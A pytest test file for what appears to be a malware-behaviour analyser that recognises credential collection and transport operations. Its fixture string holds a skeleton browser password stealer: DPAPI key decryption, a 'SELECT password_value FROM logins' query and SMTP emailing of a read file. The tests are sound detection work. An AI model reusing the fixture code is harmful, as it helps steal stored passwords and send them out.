"""Inert text verifies bindings and evidence for the collection-to-send APIs."""
import pytest
from test_operation_facts import extract
from stealer_agent.operation_assertions import render

SOURCE = '''import base64
import shutil
import sqlite3
import smtplib
from win32crypt import CryptUnprotectData
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
def inspect(path, dest, value, state, host, username, password):
    encoded = base64.b64decode(state['encrypted_key'])
    key = CryptUnprotectData(encoded, None, None, None, 0)[1]
    shutil.copy(path, dest)
    db = sqlite3.connect(dest)
    cursor = db.cursor()
    cursor.execute('SELECT password_value FROM logins')
    for row in cursor.fetchall():
        pass
    with open(path, 'rb') as src:
        data = src.read()
    with open(dest, 'w', encoding='utf-8') as target:
        target.write(value)
    msg = MIMEMultipart()
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(data)
    encoders.encode_base64(part)
    msg.attach(part)
    body = msg.as_string()
    smtp = smtplib.SMTP(host, 587)
    smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(username, recipient, body)
'''


def test_collection_staging_and_transport_calls_preserve_expression_roles(tmp_path):
    _, result = extract(tmp_path,SOURCE,'decompile_python')
    facts = {f['operation']: f for f in result['facts']}
    required = {'base64_decode','dpapi_unprotect','file_copy','database_open','sql_select','sql_fetchall',
                'file_read','file_write','mime_set_payload','mime_base64_encode','mime_attach','mime_serialize',
                'smtp_connect','smtp_starttls','smtp_login','smtp_send'}
    assert set(facts) == required
    assert facts['file_copy']['inputs'] == {'source_path_expression':'path','destination_path_expression':'dest'}
    assert facts['file_write']['inputs'] == {'path_expression':'dest','data_expression':'value'}
    assert facts['file_read']['api']=='io.BufferedIOBase.read'
    assert facts['sql_fetchall']['inputs']==facts['sql_select']['inputs']
    assert facts['sql_select']['ranges'][-1] in facts['sql_fetchall']['ranges']
    assert all(4 <= len(render(f)) <= 500 for f in result['facts'])


@pytest.mark.parametrize('change,missing',[
    (lambda s:s.replace('def inspect(path,','def inspect(open, path,'), {'file_read','file_write'}),
    (lambda s:s.replace('    msg.attach(part)','    msg = other\n    msg.attach(part)'), {'mime_attach','mime_serialize'}),
    (lambda s:s.replace('    part.set_payload(data)','    part.set_payload = other\n    part.set_payload(data)'), {'mime_set_payload'}),
    (lambda s:s.replace('    smtp.starttls()','    smtp = other\n    smtp.starttls()'), {'smtp_starttls','smtp_login','smtp_send'}),
    (lambda s:s.replace('    key =','    CryptUnprotectData = other\n    key ='), {'dpapi_unprotect'}),
    (lambda s:s.replace("'rb') as src", "'wb') as src"), {'file_read'}),
    (lambda s:s.replace("'w', encoding='utf-8') as target", "'r', encoding='utf-8') as target"), {'file_write'}),
    (lambda s:s.replace('    for row in cursor.fetchall():', "    cursor.execute(sql='SELECT other FROM other_table')\n    for row in cursor.fetchall():"), {'sql_fetchall'}),
    (lambda s:s.replace('    for row in cursor.fetchall():', "    cursor.executescript(script)\n    for row in cursor.fetchall():"), {'sql_fetchall'}),
    (lambda s:s.replace('    for row in cursor.fetchall():', "    cursor.close()\n    for row in cursor.fetchall():"), {'sql_fetchall'}),
])
def test_unresolved_mutated_or_incompatible_objects_do_not_prove_operations(tmp_path,change,missing):
    _, result = extract(tmp_path,change(SOURCE),'decompile_python')
    assert not missing & {f['operation'] for f in result['facts']}


def test_conditional_sibling_query_does_not_prove_fetch_query_identity(tmp_path):
    text=SOURCE.replace("    cursor.execute('SELECT password_value FROM logins')",
                        "    if condition:\n        cursor.execute('SELECT password_value FROM logins')")
    _, result=extract(tmp_path,text,'decompile_python')
    assert 'sql_select' in {f['operation'] for f in result['facts']}
    assert 'sql_fetchall' not in {f['operation'] for f in result['facts']}


def test_builtin_read_chain_and_unknown_open_options(tmp_path):
    _, result=extract(tmp_path,"def inspect(path):\n    return open(path, 'r', encoding='utf8').read()\n",'decompile_python')
    assert len(result['facts'])==1 and result['facts'][0]['operation']=='file_read'
    _, result=extract(tmp_path,"def inspect(path):\n    return open(path, 'r', opener=custom).read()\n",'decompile_python')
    assert result['facts']==[]


def test_wildcard_import_and_escaped_module_cannot_prove_original_binding(tmp_path):
    _, result=extract(tmp_path,'from unknown import *\n'+SOURCE,'decompile_python')
    assert result['facts']==[]
    text=SOURCE+'\nother = sqlite3\nother.connect = custom\n'
    _, result=extract(tmp_path,text,'decompile_python')
    assert not {'database_open','sql_select','sql_fetchall'} & {f['operation'] for f in result['facts']}
